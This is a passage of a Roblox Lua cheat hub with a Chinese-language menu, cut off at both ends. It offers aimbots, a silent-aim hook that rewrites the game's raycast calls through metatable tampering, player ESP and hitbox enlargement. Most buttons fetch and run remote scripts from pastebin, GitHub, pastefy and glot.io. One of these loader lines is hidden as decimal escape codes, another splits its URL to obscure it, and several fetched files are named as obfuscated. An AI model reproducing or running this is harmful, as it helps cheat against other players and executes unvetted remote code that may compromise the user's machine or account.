    -- 是否执行自瞄（按住模式判断）
    local shouldAim = true
    if not Aimbot.IsMobile and Aimbot.HoldMode then
        shouldAim = Aimbot.IsHolding
    end

    if shouldAim then
        local target = getClosestTarget()
        if target then
            cam.CFrame = CFrame.new(cam.CFrame.Position, target.Position)
        end
    end
end)

-- ========== 输入监听（按住模式） ==========
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if not Aimbot.Enabled then return end
    if not Aimbot.HoldMode or Aimbot.IsMobile then return end

    if Aimbot.TriggerMode == "鼠标左键" and input.UserInputType == Enum.UserInputType.MouseButton1 then
        Aimbot.IsHolding = true
    elseif Aimbot.TriggerMode == "鼠标右键" and input.UserInputType == Enum.UserInputType.MouseButton2 then
        Aimbot.IsHolding = true
    elseif Aimbot.TriggerMode == "键盘键" and input.KeyCode == Enum.KeyCode[Aimbot.CustomKey] then
        Aimbot.IsHolding = true
    end
end)

UserInputService.InputEnded:Connect(function(input, gameProcessed)
    if not Aimbot.HoldMode or Aimbot.IsMobile then return end

    if Aimbot.TriggerMode == "鼠标左键" and input.UserInputType == Enum.UserInputType.MouseButton1 then
        Aimbot.IsHolding = false
    elseif Aimbot.TriggerMode == "鼠标右键" and input.UserInputType == Enum.UserInputType.MouseButton2 then
        Aimbot.IsHolding = false
    elseif Aimbot.TriggerMode == "键盘键" and input.KeyCode == Enum.KeyCode[Aimbot.CustomKey] then
        Aimbot.IsHolding = false
    end
end)

-- ========== UI 控件 ==========

-- 总开关（默认关闭）
Tabs.AimTab:Toggle({
    Title = "启用自定义自瞄",
    Icon = "check",
    Default = false,
    Callback = function(v)
        Aimbot.Enabled = v
        if not v then
            Aimbot.IsHolding = false
            -- 立即隐藏
            if fovCircle then fovCircle.Visible = false end
            if circleFrame then circleFrame.Visible = false end
        end
    end
})

-- 总开关热键（默认P，点击可重选）
Tabs.AimTab:Keybind({
    Title = "自瞄开关热键（点击重选）",
    Value = "P",
    CanChange = true,
    Callback = function(key)
        Aimbot.ToggleKey = key
        Aimbot.Enabled = not Aimbot.Enabled
        if not Aimbot.Enabled then
            Aimbot.IsHolding = false
            if fovCircle then fovCircle.Visible = false end
            if circleFrame then circleFrame.Visible = false end
        end
        WindUI:Notify({
            Title = "自定义自瞄",
            Content = (Aimbot.Enabled and "✅ 已开启" or "❌ 已关闭") .. " [热键: " .. key .. "]",
            Duration = 2
        })
    end
})

-- 手机端提示
if Aimbot.IsMobile then
    Tabs.AimTab:Paragraph({
        Title = "📱 设备检测",
        Desc = "检测到移动端，已自动切换为「一直自瞄」模式（无需按住触发键）",
        Image = "smartphone",
        ImageSize = 20
    })
end

-- 按住模式
Tabs.AimTab:Toggle({
    Title = "按住模式（长按触发键才自瞄）",
    Icon = "check",
    Default = false,
    Callback = function(v)
        if Aimbot.IsMobile then
            Aimbot.HoldMode = false
            WindUI:Notify({Title = "自瞄", Content = "移动端已强制一直自瞄", Duration = 3})
            return
        end
        Aimbot.HoldMode = v
        Aimbot.IsHolding = false
    end
})

-- 触发键选择
Tabs.AimTab:Dropdown({
    Title = "按住触发键",
    Values = {"鼠标左键", "鼠标右键", "键盘键"},
    Value = "鼠标右键",
    Callback = function(v)
        Aimbot.TriggerMode = v
        Aimbot.IsHolding = false
    end
})

-- 自定义键盘键（默认Q，点击可重选）
Tabs.AimTab:Keybind({
    Title = "自定义键盘触发键（点击重选）",
    Value = "Q",
    CanChange = true,
    Callback = function(key)
        Aimbot.CustomKey = key
        Aimbot.TriggerMode = "键盘键"
        WindUI:Notify({Title = "自瞄", Content = "触发键已设为: " .. key, Duration = 2})
    end
})

-- FOV 圆圈大小
Tabs.AimTab:Slider({
    Title = "自瞄圆圈大小 (FOV)",
    Step = 1,
    Value = {Min = 0, Max = 600, Default = 150},
    Callback = function(v)
        Aimbot.FOV = v
    end
})

-- 显示圆圈（默认关闭！！）
Tabs.AimTab:Toggle({
    Title = "显示自瞄圆圈",
    Icon = "check",
    Default = false,  -- 默认关闭！
    Callback = function(v)
        Aimbot.ShowCircle = v
        if not v then
            if fovCircle then fovCircle.Visible = false end
            if circleFrame then circleFrame.Visible = false end
        end
    end
})

-- 彩虹圆圈
Tabs.AimTab:Toggle({
    Title = "彩虹圆圈颜色",
    Icon = "check",
    Default = false,
    Callback = function(v)
        Aimbot.RainbowCircle = v
    end
})

-- 圆圈自定义颜色
Tabs.AimTab:Colorpicker({
    Title = "圆圈颜色",
    Default = Color3.fromRGB(255, 255, 255),
    Callback = function(color)
        Aimbot.CircleColor = color
    end
})

-- 墙壁检测
Tabs.AimTab:Toggle({
    Title = "墙壁检测（穿墙不打）",
    Icon = "check",
    Default = true,
    Callback = function(v)
        Aimbot.WallCheck = v
    end
})

-- 死亡检测
Tabs.AimTab:Toggle({
    Title = "死亡检测（跳过尸体）",
    Icon = "check",
    Default = true,
    Callback = function(v)
        Aimbot.DeadCheck = v
    end
})

-- 队友检测
Tabs.AimTab:Toggle({
    Title = "队友检测（跳过队友）",
    Icon = "check",
    Default = true,
    Callback = function(v)
        Aimbot.TeamCheck = v
    end
})


Tabs.AimTab:Toggle({
    Title = "自瞄(朝向最近玩家头部)",
    Icon = "check",
    Default = false,
    Callback = function(enabled)
        local RunService = game:GetService("RunService")
        local Players = game:GetService("Players")
        local lp = Players.LocalPlayer
        local conn
        if enabled then
            conn = RunService.RenderStepped:Connect(function()
                local char = lp.Character
                if not char then return end
                local root = char:FindFirstChild("HumanoidRootPart")
                local hum = char:FindFirstChild("Humanoid")
                if not root or not hum then return end

                local nearestHead = nil
                local shortestDis = math.huge

                for _,player in Players:GetPlayers() do
                    if player == lp then continue end
                    local enemyChar = player.Character
                    if not enemyChar then continue end
                    local enemyRoot = enemyChar:FindFirstChild("HumanoidRootPart")
                    local enemyHead = enemyChar:FindFirstChild("Head")
                    if not enemyRoot or not enemyHead then continue end
                    local dis = (root.Position - enemyRoot.Position).Magnitude
                    if dis < shortestDis then
                        shortestDis = dis
                        nearestHead = enemyHead
                    end
                end

                if nearestHead then
                    root.CFrame = CFrame.new(root.Position, Vector3.new(nearestHead.Position.X, root.Position.Y, nearestHead.Position.Z))
                end
            end)
        else
            if conn then conn:Disconnect() end
        end
    end,
})

Tabs.AimTab:Button({
	Title = "通用自瞄",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/rspy-but-back/refs/heads/main/%E5%85%A8%E6%B8%B8%E6%88%8F%E9%80%9A%E7%94%A8%E5%AD%90%E5%BC%B9%E8%BF%BD%E8%B8%AA%20(1).txt"))()
	end 
})

Tabs.NewTab:Button({
	Title = "隐身工具",
	Callback = function()
loadstring(game:HttpGet("https://gist.githubusercontent.com/skid123skidlol/cd0d2dce51b3f20ad1aac941da06a1a1/raw/f58b98cce7d51e53ade94e7bb460e4f24fb7e0ff/%257BFE%257D%2520Invisible%2520Tool%2520(can%2520hold%2520tools)",true))()
	end 
})

Tabs.Fun:Button({
	Title = "改服装",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/6X72Mdfs"))()
	end 
})

Tabs.LightTab:Button({
	Title = "光影",
	Callback = function()
loadstring(game:HttpGet(('https://pastefy.app/xXkUxA0P/raw'),true))()
	end 
})

Tabs.Fun:Button({
	Title = "偷取别人服装",
	Callback = function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\73\110\118\111\111\107\101\114\49\49\47\79\117\116\102\105\116\47\109\97\105\110\47\79\117\116\102\105\116\67\111\112\105\101\114\46\108\117\97\34\44\32\116\114\117\101\41\41\40\41\10")()
	end 
})

Tabs.Fun:Button({
	Title = "r15-r6",
	Callback = function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-R6-Animations-on-R15-16865"))()
	end 
})

Tabs.Fun:Button({
	Title = "聊天绕过",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/BingusWR/Fechatbypassroblox/refs/heads/main/Fe%20Roblox%20ChatBypass"))()
	end 
})

Tabs.AimTab:Button({
	Title = "阿尔宙斯自瞄",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20Aimbot.lua"))()
	end 
})

Tabs.Fun:Button({
	Title = "死亡笔记",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/dingding123hhh/tt/main/%E6%AD%BB%E4%BA%A1%E7%AC%94%E8%AE%B0%20(1).txt"))()
	end 
})

Tabs.Fun:Button({
	Title = "建筑工具",
	Callback = function()
Hammer = Instance.new("HopperBin")
		Hammer.Name = "锤子"
		Hammer.BinType = 4
		Hammer.Parent = game.Players.LocalPlayer.Backpack
		Clone = Instance.new("HopperBin")
		Clone.Name = "克隆"
		Clone.BinType = 3
		Clone.Parent = game.Players.LocalPlayer.Backpack
		Grab = Instance.new("HopperBin")
		Grab.Name = "抓取"
		Grab.BinType = 2
	end 
})

Tabs.Fun:Button({
	Title = "飞车2",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/dingding123hhh/vb/main/%E9%A3%9E%E8%BD%A6.lua"))()
	end 
})

Tabs.FeZone:Button({
	Title = "帽子旋转",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/BingusWR/Fe-Spinning-Hat-Script/refs/heads/main/Fe%20Spinning%20Hats%20Script"))()
	end 
})

Tabs.Fun:Button({
	Title = "玩儿家进入游戏",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/boyscp/scriscriptsc/main/bbn.lua"))()
	end 
})

Tabs.Fun:Button({
	Title = "开启时间",
	Callback = function()
local LBLG = Instance.new("ScreenGui", getParent)
local LBL = Instance.new("TextLabel", getParent)
local player = game.Players.LocalPlayer

LBLG.Name = "LBLG"
LBLG.Parent = game.CoreGui
LBLG.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
LBLG.Enabled = true
LBL.Name = "LBL"
LBL.Parent = LBLG
LBL.BackgroundColor3 = Color3.new(1, 1, 1)
LBL.BackgroundTransparency = 1
LBL.BorderColor3 = Color3.new(0, 0, 0)
LBL.Position = UDim2.new(0.75,0,0.010,0)
LBL.Size = UDim2.new(0, 133, 0, 30)
LBL.Font = Enum.Font.GothamSemibold
LBL.Text = "TextLabel"
LBL.TextColor3 = Color3.new(1, 1, 1)
LBL.TextScaled = true
LBL.TextSize = 14
LBL.TextWrapped = true
LBL.Visible = true

local FpsLabel = LBL
local Heartbeat = game:GetService("RunService").Heartbeat
local LastIteration, Start
local FrameUpdateTable = { }

local function HeartbeatUpdate()
	LastIteration = tick()
	for Index = #FrameUpdateTable, 1, -1 do
		FrameUpdateTable[Index + 1] = (FrameUpdateTable[Index] >= LastIteration - 1) and FrameUpdateTable[Index] or nil
	end
	FrameUpdateTable[1] = LastIteration
	local CurrentFPS = (tick() - Start >= 1 and #FrameUpdateTable) or (#FrameUpdateTable / (tick() - Start))
	CurrentFPS = CurrentFPS - CurrentFPS % 1
	FpsLabel.Text = ("时间:"..os.date("%H").."时"..os.date("%M").."分"..os.date("%S")).."秒"
end
Start = tick()
Heartbeat:Connect(HeartbeatUpdate)
	end 
})

Tabs.Fun:Button({
	Title = "开启FPS显示器",
	Callback = function()
        local RunService = game:GetService("RunService")
        local lp = game:GetService("Players").LocalPlayer
        local guiName = "FPSGui"

        -- 判断是否已经创建，防止重复创建多个窗口
        local existingGui = lp.PlayerGui:FindFirstChild(guiName)
        if existingGui then
            existingGui:Destroy()
            return
        end

        local gui = Instance.new("ScreenGui")
        gui.Name = guiName
        gui.ResetOnSpawn = false
        gui.Parent = lp.PlayerGui

        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(0,110,0,32)
        label.Position = UDim2.new(0.01,0,0.01,0)
        label.BackgroundColor3 = Color3.new(0,0,0)
        label.BackgroundTransparency = 0.35
        label.TextColor3 = Color3.new(1,1,1)
        label.Font = Enum.Font.SourceSansBold
        label.TextSize = 17
        label.Parent = gui

        local frameCount = 0
        local lastClock = os.clock()

        local connection
        connection = RunService.RenderStepped:Connect(function()
            frameCount += 1
            local now = os.clock()
            if now - lastClock >= 1 then
                label.Text = "FPS："..frameCount
                frameCount = 0
                lastClock = now
            end
        end)

        -- GUI销毁同时断开循环
        gui.Destroying:Connect(function()
            if connection then
                connection:Disconnect()
            end
        end)
	end 
})

Tabs.Music:Button({
   Title = "防空警报",
   Callback = function()
    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://792323017"
    sound.Parent = game.Workspace
    sound:Play()
    end
 })
 
Tabs.Music:Button({
   Title = "义勇军进行曲",
   Callback = function()
   local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://1845918434"
    sound.Parent = game.Workspace
    sound:Play() 
   end
})

Tabs.Music:Button({
	Title = "自定义音乐",
	Callback = function()		
loadstring(game:HttpGet("https://raw.githubusercontent.com/boyscp/beta/main/music.lua"))()
    end
})

Tabs.Music:Button({
	Title = "音乐轰炸器",
	Callback = function()		
loadstring(game:HttpGet("https://raw.githubusercontent.com/boyscp/scriscriptsc/main/%E8%BD%B0%E7%82%B8.lua"))()
    end
})

Tabs.Music:Button({

	Title = "color",

	Callback = function()

local audioPlayer : AudioPlayer = Instance.new("AudioPlayer")
audioPlayer.Parent = workspace
audioPlayer.AssetId = "rbxassetid://7023828725"

local deviceOutput = Instance.new("AudioDeviceOutput")
deviceOutput.Parent = workspace

local wire = Instance.new("Wire")
wire.Parent = workspace

wire.SourceInstance = audioPlayer
wire.TargetInstance = deviceOutput

audioPlayer:Play()

    end
})

Tabs.Music:Button({
	Title = "happy song",
	Callback = function()

local audioPlayer : AudioPlayer = Instance.new("AudioPlayer")
audioPlayer.Parent = workspace
audioPlayer.AssetId = "rbxassetid://1843404009"

local deviceOutput = Instance.new("AudioDeviceOutput")
deviceOutput.Parent = workspace

local wire = Instance.new("Wire")
wire.Parent = workspace

wire.SourceInstance = audioPlayer
wire.TargetInstance = deviceOutput

audioPlayer:Play()
    end
})

Tabs.Music:Button({
	Title = "World-Hang up",
	Callback = function()

local audioPlayer : AudioPlayer = Instance.new("AudioPlayer")
audioPlayer.Parent = workspace
audioPlayer.AssetId = "rbxassetid://5410084188"

local deviceOutput = Instance.new("AudioDeviceOutput")
deviceOutput.Parent = workspace

local wire = Instance.new("Wire")
wire.Parent = workspace

wire.SourceInstance = audioPlayer
wire.TargetInstance = deviceOutput

audioPlayer:Play()
    end
})

Tabs.Music:Button({
	Title = "雨中牛郎",
	Callback = function()

local audioPlayer : AudioPlayer = Instance.new("AudioPlayer")
audioPlayer.Parent = workspace
audioPlayer.AssetId = "rbxassetid://16831108393"

local deviceOutput = Instance.new("AudioDeviceOutput")
deviceOutput.Parent = workspace

local wire = Instance.new("Wire")
wire.Parent = workspace

wire.SourceInstance = audioPlayer
wire.TargetInstance = deviceOutput

audioPlayer:Play()
end
})

Tabs.Music:Button({
  Title = "彩虹瀑布",
  Callback = function()
local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://1837879082"
    sound.Parent = game.Workspace
    sound:Play()
  end
})
Tabs.Fun:Button({
	Title = "解帧率",
	Callback = function()
loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-FpsBoost-9260"))()
	end 
})

Tabs.NewTab:Button({
	Title = "工具挂",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Bebo-Mods/BeboScripts/main/StandAwekening.lua"))()
	end 
})

Tabs.NewTab:Button({
	Title = "透视",
	Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP'))()
	end 
})

Tabs.FeZone:Button({
	Title = "获得游戏所有道具",
	Callback = function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub-Backup/main/gametoolgiver.lua"))()

end
})
Tabs.FeZone:Button({
	Title = "变npc",
	Callback = function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty13.lua"))()

end
})

Tabs.FeZone:Button({
	Title = "fe npc 控制",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/fe-source/refs/heads/main/NPC/source/main.Luau"))()
	end 
})

Tabs.FeZone:Button({
	Title = "超长坤坤",
	Callback = function()

loadstring(game:HttpGet("https://pastebin.com/raw/ESWSFND7", true))()

end
})
Tabs.FeZone:Button({
	Title = "动画中心",
	Callback = function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Animation-Hub/main/Animation%20Gui", true))()

end
})
Tabs.FeZone:Button({
	Title = "C00lgui",
	Callback = function()

loadstring(game:GetObjects("rbxassetid://8127297852")[1].Source)()

end
})

Tabs.AimTab:Button({
	Title = "小羊自瞄",
	Callback = function()
loadstring(game:HttpGet("https://pastefy.app/ZYMlyhhz/raw",true))()
	end 
})

Tabs.AimTab:Button({
	Title = "英文自瞄",
	Callback = function()
loadstring(game:HttpGet("https://rentry.co/n55gmtpi/raw", true))()
	end 
})

Tabs.AimTab:Button({
       Title = "自瞄50",
       Callback = function()

loadstring(game:HttpGet("https://pastefy.app/b3uXjRF6/raw",true))()

end
})
Tabs.AimTab:Button({
       Title = "自瞄100",
       Callback = function()

loadstring(game:HttpGet("https://pastefy.app/tQrd2r0L/raw",true))()

end
})
Tabs.AimTab:Button({
       Title = "自瞄150",
       Callback = function()

loadstring(game:HttpGet("https://pastefy.app/UOQWFvGp/raw",true))()

end
})
Tabs.AimTab:Button({
       Title = "自瞄200",
       Callback = function()

loadstring(game:HttpGet("https://pastefy.app/b5CuDuer/raw",true))()

end
})
Tabs.AimTab:Button({
       Title = "自瞄250",
       Callback = function()

loadstring(game:HttpGet("https://pastefy.app/p2huH7eF/raw",true))()

end
})
Tabs.AimTab:Button({
       Title = "自瞄300",
       Callback = function()

loadstring(game:HttpGet("https://pastefy.app/nIyVhrvV/raw",true))()

end
})
Tabs.AimTab:Button({
       Title = "自瞄350",
       Callback = function()

loadstring(game:HttpGet("https://pastefy.app/pnjKHMvV/raw",true))()

end
})
Tabs.AimTab:Button({
       Title = "自瞄400",
       Callback = function()

loadstring(game:HttpGet("https://pastefy.app/LQuP7sjj/raw",true))()

end
})
Tabs.AimTab:Button({
       Title = "自瞄600",
       Callback = function()

loadstring(game:HttpGet("https://pastefy.app/WmcEe2HB/raw",true))()

end
})
Tabs.AimTab:Button({
       Title = "自瞄全屏",
       Callback = function()

loadstring(game:HttpGet("https://pastefy.app/n5LhGGgf/raw",true))()

end
})

local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local Cam = workspace.CurrentCamera
local renderConn
local fov = 250
local wallCheckToggle = false

local FOVring = Drawing.new("Circle")
FOVring.Visible = false
FOVring.Thickness = 2
FOVring.Color = Color3.fromRGB(128, 0, 128)
FOVring.Filled = false
FOVring.Radius = fov

local function UpdateDraw()
    FOVring.Position = Cam.ViewportSize / 2
end

local function LookAt(targetPos)
    Cam.CFrame = CFrame.new(Cam.CFrame.Position, targetPos)
end

local function IsBlocked(start, target)
    local par = RaycastParams.new()
    par.FilterDescendantsInstances = {Players.LocalPlayer.Character}
    par.FilterType = Enum.RaycastFilterType.Exclude
    return workspace:Raycast(start, target - start, par)
end

local function GetTarget()
    local closest, minDis = nil, math.huge
    local mid = Cam.ViewportSize / 2
    for _,plr in ipairs(Players:GetPlayers()) do
        if plr == Players.LocalPlayer then continue end
        local char = plr.Character
        if not char then continue end
        local head = char:FindFirstChild("Head")
        if not head then continue end
        local scrPos, vis = Cam:WorldToViewportPoint(head.Position)
        local dis = (Vector2.new(scrPos.X, scrPos.Y) - mid).Magnitude
        
        local blocked = false
        if wallCheckToggle then
            blocked = IsBlocked(Cam.CFrame.Position, head.Position)
        end
        
        if dis < minDis and dis < fov and vis and not blocked then
            minDis = dis
            closest = head.Position
        end
    end
    return closest
end

Tabs.AimTab:Toggle({
    Title = "自瞄",
    Icon = "check",
    Default = false,
    Callback = function(enabled)
        if enabled then
            FOVring.Visible = true
            renderConn = RunService.RenderStepped:Connect(function()
                UpdateDraw()
                local target = GetTarget()
                if target then
                    LookAt(target)
                end
            end)
        else
            if renderConn then
                renderConn:Disconnect()
                renderConn = nil
            end
            FOVring.Visible = false
        end
    end,
})


Tabs.AimTab:Toggle({
    Title = "墙体阻挡检测",
    Icon = "eye",
    Default = false,
    Callback = function(enabled)
        wallCheckToggle = enabled
    end,
})

Tabs.AimTab:Input({
    Title = "FOV范围调节",
    Value = "250",
    Placeholder = "输入数字修改圈大小",
    Callback = function(input)
        local num = tonumber(input)
        if num then
            fov = num
            FOVring.Radius = fov
        end
    end
})

Tabs.PlayerRangeTab:Button({
	Title = "普通范围",
	Callback = function()

loadstring(game:HttpGet("https://pastebin.com/raw/jiNwDbCN"))()

end
})
Tabs.PlayerRangeTab:Button({
	Title = "中等范围",
	Callback = function()

loadstring(game:HttpGet("https://pastebin.com/raw/x13bwrFb"))()

end
})
Tabs.PlayerRangeTab:Button({
	Title = "全图范围",
	Callback = function()

loadstring(game:HttpGet("https://pastebin.com/raw/KKY9EpZU"))()

end
})
Tabs.PlayerRangeTab:Button({
	Title = "终极范围",
	Callback = function()

loadstring(game:HttpGet("https://pastebin.com/raw/CAQ9x4A7"))()

end
})

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local renderConn
local markSize = 30

Tabs.PlayerRangeTab:Toggle({
    Title = "调节范围",
    Icon = "check",
    Default = false,
    Callback = function(enabled)
        if enabled then
            renderConn = RunService.RenderStepped:Connect(function()
                for _,v in ipairs(Players:GetPlayers()) do
                    if v == Players.LocalPlayer then continue end
                    local char = v.Character
                    if not char then continue end
                    local hrp = char:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        pcall(function()
                            hrp.Size = Vector3.new(markSize,markSize,markSize)
                            hrp.Transparency = 0.7
                            hrp.BrickColor = BrickColor.new("Really red")
                            hrp.Material = Enum.Material.Neon
                            hrp.CanCollide = false
                        end)
                    end
                end
            end)
        else
            if renderConn then
                renderConn:Disconnect()
                renderConn = nil
                for _,v in ipairs(Players:GetPlayers()) do
                    local char = v.Character
                    if not char then continue end
                    local hrp = char:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        pcall(function()
                            hrp.Size = Vector3.new(2,2,1)
                            hrp.Transparency = 0
                            hrp.Material = Enum.Material.Plastic
                            hrp.CanCollide = true
                        end)
                    end
                end
            end
        end
    end,
})
Tabs.PlayerRangeTab:Input({
    Title = "标记范围大小",
    Value = "30",
    Placeholder = "输入数字修改范围",
    Callback = function(input)
        local num = tonumber(input)
        if num and num > 0 then
            markSize = num
        end
    end
})

Tabs.FeZone:Button({
  Title =  "让走路和跳跃变卡(对别人没影响)",
  Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Fe%20Fake%20Lag%20Obfuscator'))()
  end
})

Tabs.FeZone:Button({
  Title =  "滚动",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/BOOSBS/111/refs/heads/main/192"))()
  end
})

Tabs.FeZone:Button({
  Title =  "动画包",
  Callback = function()

loadstring(game:HttpGet("https://pastebin.com/raw/fTsp2ZgP"))()

  end
})

Tabs.FeZone:Button({
  Title =  "控制玩家",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/BOOSBS/BOOSBS/refs/heads/main/README.md"))()
  end
})

Tabs.FeZone:Button({
  Title =  "认真反复横跳",
  Callback = function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_11l7Y131YqJjZ31QmV5L8pI23V02b3191sEg26E75472Wl78Vi8870jRv5txZyL1.lua.txt"))()
  end
})

Tabs.Fun:Button({
	Title = "让物体飞",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/BOOSBS/ajduoxc/refs/heads/main/ajduoxcz"))()
	end 
})

Tabs.Fun:Button({
	Title = "刷道具",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/wT1aKD4B"))()
	end 
})

Tabs.FeZone:Button({
	Title = "灵魂出窍",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/ahK5jRxM"))()
	end 
})

Tabs.AimTab:Button({
	Title = "子追",
	Callback = function()
local Camera = game:GetService("Workspace").CurrentCamera
local Players = game:GetService("Players")
local LocalPlayer = game:GetService("Players").LocalPlayer

local function GetClosestPlayer()
   local ClosestPlayer = nil
   local FarthestDistance = math.huge

   for i, v in pairs(Players.GetPlayers(Players)) do
       if v ~= LocalPlayer and v.Character and v.Character.FindFirstChild(v.Character, "HumanoidRootPart") then
           local DistanceFromPlayer = (LocalPlayer.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).Magnitude

           if DistanceFromPlayer < FarthestDistance then
               FarthestDistance = DistanceFromPlayer
               ClosestPlayer = v
           end
       end
   end

   if ClosestPlayer then
       return ClosestPlayer
   end
end

local GameMetaTable = getrawmetatable(game)
local OldGameMetaTableNamecall = GameMetaTable.__namecall
setreadonly(GameMetaTable, false)

GameMetaTable.__namecall = newcclosure(function(object, ...)
   local NamecallMethod = getnamecallmethod()
   local Arguments = {...}

   if tostring(NamecallMethod) == "FindPartOnRayWithIgnoreList" then
       local ClosestPlayer = GetClosestPlayer()
       
       if ClosestPlayer and ClosestPlayer.Character then
           Arguments[1] = Ray.new(Camera.CFrame.Position, (ClosestPlayer.Character.Head.Position - Camera.CFrame.Position).Unit * (Camera.CFrame.Position - ClosestPlayer.Character.Head.Position).Magnitude)
       end
   end

   return OldGameMetaTableNamecall(object, unpack(Arguments))
end)

setreadonly(GameMetaTable, true)
	end 
})

Tabs.NewTab:Button({
	Title = "视角锁定",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/gdLR5Z7X"))()
	end 
})

Tabs.FeZone:Button({
	Title = "聊天框画画",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ocfi/Draw-To-Chat-Obfuscated/refs/heads/main/Draw%20to%20Chat"))()
	end 
})

Tabs.FeZone:Button({
  Title = "定住自己",
  Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/YrfBSuWw"))()
  end
})

Tabs.FeZone:Button({
   Title = "工具包",
   Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Bebo-Mods/BeboScripts/main/StandAwekening.lua"))()
   end
})

Tabs.LightTab:Button({
	Title = "自定义画质包",
	Callback = function()
loadstring(game:HttpGet(('https://pastefy.app/xXkUxA0P/raw'),true))()
end
})

Tabs.LightTab:Button({
      Title = "恢复默认",
      Callback = function()
        game.Lighting.Ambient = Color3.new(0, 0, 0)
      end
    })


Tabs.LightTab:Button({
      Title = "亮度1",
      Callback = function()
        game.Lighting.Ambient = Color3.new(1, 1, 1)
      end
    })
Tabs.LightTab:Button({
      Title = "亮度2",
      Callback = function()
        game.Lighting.Ambient = Color3.new(2, 2, 2)
      end
    })

Tabs.LightTab:Button({
      Title = "亮度3",
      Callback = function()
        game.Lighting.Ambient = Color3.new(3, 3, 3)
      end
    })

Tabs.LightTab:Button({
	Title = "红色",
	Callback = function()
game.Lighting.Ambient = Color3.new(1, 0, 0)
end
})    
Tabs.LightTab:Button({
	Title = "绿色",
	Callback = function()
game.Lighting.Ambient = Color3.new(0, 1, 0)
end
})    

Tabs.LightTab:Button({
      Title = "蓝色",
      Callback = function()
        game.Lighting.Ambient = Color3.new(0, 0, 1)
      end
    })
Tabs.LightTab:Button({
  Title = "红色(2)",
  Default = false,
  Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MZEEN2424/Graphics/main/Graphics.xml"))()
  end
})

Tabs.LightTab:Button({
  Title = "美丽天空（带动态阴影）",
  Callback = function()
    -- Roblox Graphics Enhancher
    local light = game.Lighting
    for i, v in pairs(light:GetChildren()) do
      v:Destroy()
    end

    local ter = workspace.Terrain
    local color = Instance.new("ColorCorrectionEffect")
    local bloom = Instance.new("BloomEffect")
    local sun = Instance.new("SunRaysEffect")
    local blur = Inst
  end
})

Tabs.BlackHoleTab:Button({
  Title = "辅助脚本(可以让黑洞吸力更强)",
  Callback = function()
if "you wanna use rochips universal" then
	local z_x,z_z="gzrux646yj/raw/main.ts","https://glot.io/snippets/"
	local im,lonely,z_c=task.wait,game,loadstring
	z_c(lonely:HttpGet(z_z..""..z_x))()
	return ("This will load in about 2 - 30 seconds" or "according to your device and executor")
end
  end
})

Tabs.BlackHoleTab:Button({
  Title = "辅助脚本第2种(可以切换黑洞模式)",
  Callback = function()
loadstring(game:HttpGet("https://gist.githubusercontent.com/AxolotlBmgo/8888080921c2b426a32dd9ff587baff1/raw/d45e03afed3c1716f36523bbf6dd741d3d2aad00/gistfile1.txt"))()
  end
})

Tabs.BlackHoleTab:Button({
  Title = "黑洞之神(别人应该看不见)",
  Callback = function()
  local UserInputService = game:GetService("UserInputService")
local Mouse = game:GetService("Players").LocalPlayer:GetMouse()
local MaxRange = 100  -- Set your maximum range

local LocalPlayer = game:GetService("Players").LocalPlayer
local Character = LocalPlayer.Character
local HumanoidRootPart = Character and Character:FindFirstChild("HumanoidRootPart")

if not HumanoidRootPart then
    print("Cannot find the HumanoidRootPart of your character. Please ensure your character has been fully loaded.")
    return
end

local Attachment1 = Instance.new("Attachment", HumanoidRootPart)

local function TeleportPart(v)
    if v:IsA("Part") and v.Parent ~= Character and not v:IsDescendantOf(Character) then
        Mouse.TargetFilter = v
        for _, x in next, v:GetChildren() do
            if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
